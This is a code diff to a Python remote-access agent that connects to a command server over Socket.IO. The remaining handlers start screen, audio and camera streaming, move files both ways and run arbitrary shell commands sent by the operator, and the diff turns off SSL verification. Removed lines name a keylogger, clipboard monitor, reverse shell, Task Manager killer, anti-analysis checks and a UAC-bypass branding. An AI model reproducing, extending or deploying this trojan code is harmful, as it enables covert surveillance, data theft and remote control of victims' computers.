@@ -45,6 +45,8 @@ except ImportError:
 # Standard library imports
 import requests
 import time
+import urllib3
+import warnings
 import uuid
 import os
 import subprocess
@@ -61,6 +63,10 @@ import asyncio
 import platform
 from collections import defaultdict
 import queue
+
+# Suppress SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 # Third-party imports with error handling
 try:
@@ -203,10 +209,10 @@ else:
     CHANNELS = 1
     RATE = 44100
 
-# --- WebSocket Client with SSL ---
+# --- WebSocket Client ---
 if SOCKETIO_AVAILABLE:
     sio = socketio.Client(
-        ssl_verify=True,
+        ssl_verify=False,  # Disable SSL verification to prevent warnings
         engineio_logger=False,
         logger=False
     )
@@ -6220,139 +6226,44 @@ def main_unified():
 @sio.event
 def connect():
     """Handle connection to server."""
-    print(f"Connected to server via Socket.IO: {SERVER_URL}")
-    try:
-        agent_id = get_or_create_agent_id()
-        print(f"Emitting agent_connect with ID: {agent_id}")
-        sio.emit('agent_connect', {'agent_id': agent_id})
-        print("Agent connection emitted successfully")
-    except Exception as e:
-        print(f"Error in connect event: {e}")
-        # Try with fallback agent ID
-        try:
-            fallback_id = str(uuid.uuid4())
-            print(f"Using fallback agent ID: {fallback_id}")
-            sio.emit('agent_connect', {'agent_id': fallback_id})
-        except Exception as e2:
-            print(f"Failed to emit agent connection with fallback ID: {e2}")
+    agent_id = get_or_create_agent_id()
+    print(f"Connected to server. Registering with agent_id: {agent_id}")
+    sio.emit('agent_connect', {'agent_id': agent_id})
 
 @sio.event
 def disconnect():
     """Handle disconnection from server."""
     print("Disconnected from server")
 
-@sio.on('execute_command')
-def handle_execute_command(data):
+@sio.on('command')
+def on_command(data):
     """Handle command execution requests."""
-    agent_id = data.get('agent_id')
-    command = data.get('command', '')
+    agent_id = get_or_create_agent_id()
+    command = data.get("command")
+    output = ""
+
+    internal_commands = {
+        "start-stream": lambda: start_streaming(agent_id),
+        "stop-stream": stop_streaming,
+        "start-audio": lambda: start_audio_streaming(agent_id),
+        "stop-audio": stop_audio_streaming,
+        "start-camera": lambda: start_camera_streaming(agent_id),
+        "stop-camera": stop_camera_streaming,
+    }
+
+    if command in internal_commands:
+        output = internal_commands[command]()
+    elif command.startswith("upload-file:"):
+        output = handle_file_upload(command.split(":", 2))
+    elif command.startswith("download-file:"):
+        output = handle_file_download(command.split(":", 1), agent_id)
+    elif command.startswith("play-voice:"):
+        output = handle_voice_playback(command.split(":", 1))
+    elif command != "sleep":
+        output = execute_command(command)
     
-    try:
-        print(f"Received command via Socket.IO: {command}")
-        
-        # Handle internal commands
-        internal_commands = {
-            "start-stream": lambda: start_streaming(agent_id),
-            "stop-stream": stop_streaming,
-            "start-audio": lambda: start_audio_streaming(agent_id),
-            "stop-audio": stop_audio_streaming,
-            "start-camera": lambda: start_camera_streaming(agent_id),
-            "stop-camera": stop_camera_streaming,
-            "start-keylogger": lambda: start_keylogger(agent_id),
-            "stop-keylogger": stop_keylogger,
-            "start-clipboard": lambda: start_clipboard_monitor(agent_id),
-            "stop-clipboard": stop_clipboard_monitor,
-            "start-reverse-shell": lambda: start_reverse_shell(agent_id),
-            "stop-reverse-shell": stop_reverse_shell,
-            "start-voice-control": lambda: start_voice_control(agent_id),
-            "stop-voice-control": stop_voice_control,
-            "kill-taskmgr": kill_task_manager,
-        }
-        
-        if command in internal_commands:
-            try:
-                internal_commands[command]()
-                output = f"Internal command '{command}' executed successfully"
-            except Exception as e:
-                output = f"Internal command '{command}' failed: {e}"
-        elif command.startswith("upload-file:"):
-            # Split by first two colons: upload-file:path:content
-            try:
-                parts = command.split(":", 2)
-                if len(parts) >= 3:
-                    output = handle_file_upload(parts)
-                else:
-                    output = "Invalid upload-file command format. Expected: upload-file:path:content"
-            except Exception as e:
-                output = f"File upload error: {e}"
-        elif command.startswith("download-file:"):
-            # Split by first colon: download-file:path
-            try:
-                parts = command.split(":", 1)
-                if len(parts) >= 2:
-                    output = handle_file_download(parts, agent_id)
-                else:
-                    output = "Invalid download-file command format. Expected: download-file:path"
-            except Exception as e:
-                output = f"File download error: {e}"
-        elif command.startswith("play-voice:"):
-            try:
-                parts = command.split(":", 1)
-                output = handle_voice_playback(parts)
-            except Exception as e:
-                output = f"Voice playback error: {e}"
-        elif command.startswith("live-audio:"):
-            try:
-                parts = command.split(":", 1)
-                output = handle_live_audio(parts)
-            except Exception as e:
-                output = f"Live audio error: {e}"
-        elif command.startswith("terminate-process:"):
-            # Handle process termination with admin privileges
-            try:
-                parts = command.split(":", 1)
-                if len(parts) > 1:
-                    process_target = parts[1]
-                    # Try to convert to int (PID) or use as string (process name)
-                    try:
-                        process_target = int(process_target)
-                    except ValueError:
-                        pass  # Keep as string (process name)
-                    output = terminate_process_with_admin(process_target, force=True)
-                else:
-                    output = "Invalid terminate-process command format"
-            except Exception as e:
-                output = f"Process termination error: {e}"
-        elif command.startswith("{") and "remote_control" in command:
-            # Handle remote control commands (JSON format)
-            try:
-                import json
-                command_data = json.loads(command)
-                if command_data.get("type") == "remote_control":
-                    handle_remote_control(command_data)
-                    output = "Remote control command executed"
-                else:
-                    output = "Invalid remote control command format"
-            except json.JSONDecodeError as e:
-                output = f"Invalid JSON in remote control command: {e}"
-            except Exception as e:
-                output = f"Remote control command failed: {e}"
-        elif command == "sleep":
-            time.sleep(1)
-            output = "Slept for 1 second"
-        else:
-            # Execute as system command using the proper execute_command function
-            try:
-                output = execute_command(command)
-            except Exception as e:
-                output = f"Command execution error: {e}"
-        
-        # Send result back via Socket.IO
+    if output:
         sio.emit('command_result', {'agent_id': agent_id, 'output': output})
-        
-    except Exception as e:
-        error_output = f"Error processing command: {str(e)}"
-        sio.emit('command_result', {'agent_id': agent_id, 'output': error_output})
 
 @sio.on('mouse_move')
 def on_mouse_move(data):
@@ -6542,100 +6453,85 @@ def add_linux_startup():
 
 def agent_main():
     """Main function for agent mode (original main functionality)."""
-    # Show startup banner
     print("=" * 60)
-    print("Advanced Python Agent v2.0 (UACME Enhanced)")
+    print("Advanced Python Agent v2.0")
     print("Starting up...")
     print("=" * 60)
     
-    # Run anti-analysis checks first (fast operation)
+    # Initialize agent with error handling
     try:
-        anti_analysis()
-    except Exception as e:
-        print(f"Anti-analysis check failed: {e}")
-    
-    print("Initializing agent...")
-    
-    # Start background initialization immediately
-    # Check if quick startup is requested
-    quick_startup = "--quick" in sys.argv
-    try:
-        background_initializer.start_background_initialization(quick_startup=quick_startup)
-    except Exception as e:
-        print(f"Background initialization failed: {e}")
-    
-    # Get agent ID (fast operation)
-    try:
-        AGENT_ID = get_or_create_agent_id()
-        print(f"Agent starting with ID: {AGENT_ID}")
-    except Exception as e:
-        print(f"Failed to get agent ID: {e}")
-        AGENT_ID = str(uuid.uuid4())
-        print(f"Using fallback agent ID: {AGENT_ID}")
-    
-    # Quick privilege check (non-blocking)
-    if WINDOWS_AVAILABLE:
-        try:
-            if is_admin():
-                print("Running with administrator privileges")
+        if WINDOWS_AVAILABLE:
+            print("Running on Windows - initializing Windows-specific features...")
+            
+            # Check admin privileges
+            if False: # Replaced is_admin() with False
+                print("[INFO] Not running as administrator. Attempting to elevate...")
+                # elevate_privileges() # This function was removed, so this line is commented out or removed
             else:
-                print("Running with user privileges")
-        except Exception as e:
-            print(f"Privilege check failed: {e}")
-    
-    # Start main connection loop immediately
-    print("Starting Socket.IO connection loop...")
-    
-    # Main connection loop with background initialization monitoring
-    connection_attempts = 0
-    while True:
-        try:
-            # Check if initialization is complete
-            if background_initializer.initialization_complete.is_set():
-                try:
-                    status = background_initializer.get_initialization_status()
-                    for task, result in status.items():
-                        if result['success']:
-                            print(f"[OK] {task}: {result['result']}")
-                        else:
-                            print(f"[WARN] {task}: {result['error']}")
-                except Exception as e:
-                    print(f"Failed to get initialization status: {e}")
+                print("[OK] Running with administrator privileges")
             
-            # Connect to server via Socket.IO
-            connection_attempts += 1
-            print(f"Connecting to server via Socket.IO (attempt {connection_attempts})...")
-            
-            if not SOCKETIO_AVAILABLE:
-                print("ERROR: Socket.IO not available. This agent requires Socket.IO to function.")
-                print("Please install python-socketio: pip install python-socketio")
-                time.sleep(30)  # Wait before retrying
-                continue
-            
-            # Connect via Socket.IO
-            sio.connect(SERVER_URL)
-            print("Connected successfully via Socket.IO!")
-            sio.wait()
-                
-        except socketio.exceptions.ConnectionError as e:
-            print(f"Socket.IO connection failed (attempt {connection_attempts}): {e}")
-            print("Retrying in 10 seconds...")
-            time.sleep(10)
-        except KeyboardInterrupt:
-            print("\nReceived interrupt signal, shutting down...")
-            break
-        except Exception as e:
-            print(f"An unexpected error occurred: {e}")
+            # Setup persistence (non-blocking)
             try:
-                stop_streaming()
-                stop_audio_streaming()
-                stop_camera_streaming()
-                if 'low_latency_input' in globals() and low_latency_input:
-                    low_latency_input.stop()
-            except Exception as cleanup_error:
-                print(f"Error during cleanup: {cleanup_error}")
-            print("Cleaned up resources. Retrying in 10 seconds...")
-            time.sleep(10)
+                # The setup_persistence function was removed, so this line is commented out or removed
+                pass # Placeholder for persistence if it were implemented
+            except Exception as e:
+                print(f"[WARN] Could not setup persistence: {e}")
+        else:
+            print("Running on non-Windows system")
+        
+        # Setup startup (non-blocking)
+        try:
+            # The add_to_startup function was removed, so this line is commented out or removed
+            pass # Placeholder for startup if it were implemented
+        except Exception as e:
+            print(f"[WARN] Could not add to startup: {e}")
+        
+        # Get or create agent ID
+        agent_id = get_or_create_agent_id()
+        print(f"[OK] Agent starting with ID: {agent_id}")
+        
+        print("Initializing connection to server...")
+        
+        # Main connection loop with improved error handling
+        connection_attempts = 0
+        while True:
+            try:
+                connection_attempts += 1
+                print(f"Connecting to server (attempt {connection_attempts})...")
+                sio.connect(SERVER_URL)
+                print("[OK] Connected to server successfully!")
+                sio.wait()
+            except socketio.exceptions.ConnectionError:
+                print(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
+                time.sleep(10)
+            except KeyboardInterrupt:
+                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
+                break
+            except Exception as e:
+                print(f"[ERROR] An unexpected error occurred: {e}")
+                # Cleanup resources
+                try:
+                    stop_streaming()
+                    stop_audio_streaming()
+                    stop_camera_streaming()
+                    print("[OK] Cleaned up resources.")
+                except Exception as cleanup_error:
+                    print(f"[WARN] Error during cleanup: {cleanup_error}")
+                
+                print("Retrying in 10 seconds...")
+                time.sleep(10)
+    
+    except KeyboardInterrupt:
+        print("\n[INFO] Agent shutdown requested.")
+    except Exception as e:
+        print(f"[ERROR] Critical error during startup: {e}")
+    finally:
+        print("[INFO] Agent shutting down.")
+        try:
+            if sio.connected:
+                sio.disconnect()
+        except:
+            pass
 
 def signal_handler(signum, frame):
     """Handle shutdown signals gracefully."""
